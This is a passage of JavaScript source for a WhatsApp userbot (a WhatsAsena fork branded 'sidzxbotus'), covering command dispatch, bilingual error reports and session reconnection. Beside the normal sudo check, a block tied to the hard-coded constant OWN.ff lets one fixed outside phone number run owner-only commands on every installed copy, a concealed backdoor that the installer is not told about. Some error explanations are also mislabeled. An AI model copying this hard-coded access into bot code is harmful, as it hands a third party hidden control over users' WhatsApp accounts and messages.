                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 
*/
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '-- HATA RAPORU [WHATSASENA] --' + 
                                    '\n*WhatsAsena bir hata gerçekleşti!*'+
                                    '\n_Bu hata logunda numaranız veya karşı bir tarafın numarası olabilir. Lütfen buna dikkat edin!_' +
                                    '\n_Yardım için Telegram grubumuza yazabilirsiniz._' +
                                    '\n_Bu mesaj sizin numaranıza (kaydedilen mesajlar) gitmiş olmalıdır._' +
                                    '\n_Hatayı https://chat.whatsapp.com/BPNzFEBUVbT1MnfNv3uTvL bu gruba iletebilirsiniz._\n\n' +
                                    'Gerçekleşen Hata: ' + error + '\n\n'
                                    , MessageType.text, {detectLinks: false});

                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Only Absolutely URLs Supported' +
                                        '\n*Nedeni:* Medya araçlarının (xmedia, sticker..) LOG numarasında kullanılması.' +
                                        '\n*Çözümü:* LOG numarası hariç herhangi bir sohbette komut kullanılabilir.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* SQL Database Error' +
                                        '\n*Nedeni:* Database\'in bozulması. ' +
                                        '\n*Solution:* Bilinen herhangi bir çözümü yoktur. Yeniden kurmayı deneyebilirsiniz.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Split of Undefined' +
                                        '\n*Nedeni:* Grup adminlerinin kullanabildiği komutların ara sıra split fonksiyonunu görememesi. ' +
                                        '\n*Çözümü:* Restart atmanız yeterli olacaktır.'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Ookla Server Connection' +
                                        '\n*Nedeni:* Speedtest verilerinin sunucuya iletilememesi.' +
                                        '\n*Çözümü:* Bir kez daha kullanırsanız sorun çözülecektir.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Requested Audio Params' +
                                        '\n*Nedeni:* TTS komutunun latin alfabesi dışında kullanılması.' +
                                        '\n*Çözümü:* Komutu latin harfleri çerçevesinde kullanırsanız sorun çözülecektir.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* No Such File or Directory' +
                                        '\n*Nedeni:* Pluginin yanlış kodlanması.' +
                                        '\n*Çözümü:* Lütfen plugininin kodlarını kontrol edin.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Error 404 HTTPS' +
                                        '\n*Nedeni:* Heroku plugini altındaki komutların kullanılması sonucu sunucu ile iletişime geçilememesi.' +
                                        '\n*Çözümü:* Biraz bekleyip tekrar deneyin. Hala hata alıyorsanız internet sitesi üzerinden işlemi gerçekleştirin.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Reply Delete Function' +
                                        '\n*Nedeni:* IMG yada Wiki komutlarının kullanılması.' +
                                        '\n*Çözümü:* Bu hatanın çözümü yoktur. Önemli bir hata değildir.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Reply Delete Function' +
                                        '\n*Nedeni:* IMG yada Wiki komutlarının kullanılması.' +
                                        '\n*Çözümü:* Bu hatanın çözümü yoktur. Önemli bir hata değildir.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Bailyes Action Error ' +
                                        '\n*Nedeni:* Tam nedeni bilinmiyor. Birden fazla seçenek bu hatayı tetiklemiş olabilir.' +
                                        '\n*Çözümü:* Bir kez daha kullanırsanız düzelebilir. Hata devam ediyorsa restart atmayı deneyebilirsiniz.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Cannot Decode Text or Media' +
                                        '\n*Nedeni:* Pluginin yanlış kullanımı.' +
                                        '\n*Çözümü:* Lütfen komutları plugin açıklamasında yazdığı gibi kullanın.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Word Character Usage' +
                                        '\n*Nedeni:* TTP, ATTP gibi komutların latin alfabesi dışında kullanılması.' +
                                        '\n*Çözümü:* Komutu latif alfabesi çerçevesinde kullanırsanız sorun çözülecektir.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️' + 
                                        '\n========== Hata Okundu! ==========' +
                                        '\n\n*Ana Hata:* Deleting Plugin' +
                                        '\n*Nedeni:* Silinmek istenen plugin isminin yanlış girilmesi.' +
                                        '\n*Çözümü:* Lütfen silmek istediğiniz pluginin başına __ _koymadan deneyin. Hala hata alıyorsanız ismin sonundaki_ ?(.*) / $ gibi ifadeleri eksiksiz girin.'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '🙇🏻 Maalesef Bu Hatayı Okuyamadım! 🙇🏻' +
                                        '\n_Daha fazla yardım için grubumuza yazabilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await conn.sendMessage(conn.user.jid, '-- ERROR REPORT [sidzxbotus ] --' + 
                                    '\n*sidzxbotus  an error has occurred!*'+
                                    '\n*This error log may include your number or the number of an opponent. Please be careful with it!*' +
                                    '\n*You can write to our Telegram group for help.*' +
                                    '\n*Aslo you can join our support group:* https://chat.whatsapp.com/FsDjV2uRKce4wgMpAtYwyf' +
                                    '\n*This message should have gone to your number (saved messages).*\n\n' +
                                    'Error: ' + error + '\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Only Absolutely URLs Supported' +
                                        '\n*Reason:* The usage of media tools (xmedia, sticker..) in the LOG number.' +
                                        '\n*Solution:* You can use commands in any chat, except the LOG number.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Deleting Plugin' +
                                        '\n*Reason:* Entering incorrectly the name of the plugin wanted to be deleted.' +
                                        '\n*Solution:* Please try without adding __ _to the plugin you want to delete. If you still get an error, try to add like_ ?(.*) / $ to the end of the name. '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Split of Undefined' +
                                        '\n*Reason:* Commands that can be used by group admins occasionally dont see the split function. ' +
                                        '\n*Solution:* Restarting will be enough.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* SQL Database Error' +
                                        '\n*Reason:* Database corruption. ' +
                                        '\n*Solution:* There is no known solution. You can try reinstalling it.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Ookla Server Connection' +
                                        '\n*Reason:* Speedtest data cannot be transmitted to the server.' +
                                        '\n*Solution:* If you use it one more time the problem will be solved.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Requested Audio Params' +
                                        '\n*Reason:* Using the TTS command outside the Latin alphabet.' +
                                        '\n*Solution:* The problem will be solved if you use the command in Latin letters frame.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved ==========' +
                                        '\n\n*Main Error:* No Such File or Directory' +
                                        '\n*Reason:* Incorrect coding of the plugin.' +
                                        '\n*Solution:* Please check the your plugin codes.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Error 404 HTTPS' +
                                        '\n*Reason:* Failure to communicate with the server as a result of using the commands under the Heroku plugin.' +
                                        '\n*Solution:* Wait a while and try again. If you still get the error, perform the transaction on the website..'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Reply Delete Function' +
                                        '\n*Reason:* Using IMG or Wiki commands.' +
                                        '\n*Solution:* There is no solution for this error. It is not a fatal error.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Reply Delete Function' +
                                        '\n*Reason:* Using IMG or Wiki commands.' +
                                        '\n*Solution:* There is no solution for this error. It is not a fatal error.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Bailyes Action Error ' +
                                        '\n*Reason:* The exact reason is unknown. More than one option may have triggered this error.' +
                                        '\n*Solution:* If you use it again, it may improve. If the error continues, you can try to restart.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Cannot Decode Text or Media' +
                                        '\n*Reason:* Incorrect use of the plug.' +
                                        '\n*Solution:* Please use the commands as written in the plugin description.'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '⚕️ ERROR ANALYSIS [sidzxbotus ] ⚕️' + 
                                        '\n========== Error Resolved! ==========' +
                                        '\n\n*Main Error:* Word Character Usage' +
                                        '\n*Reason:* Using commands such as TTP, ATTP outside the Latin alphabet.' +
                                        '\n*Solution:* The problem will be solved if you use the command in Latin alphabet..'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻' +
                                        '\n_You can write to our support group for more help /nhttps://chat.whatsapp.com/FsDjV2uRKce4wgMpAtYwyf._'
                                        , MessageType.text
                                    );
                                }    
                            }                      
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Eski sürüm stringiniz yenileniyor...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
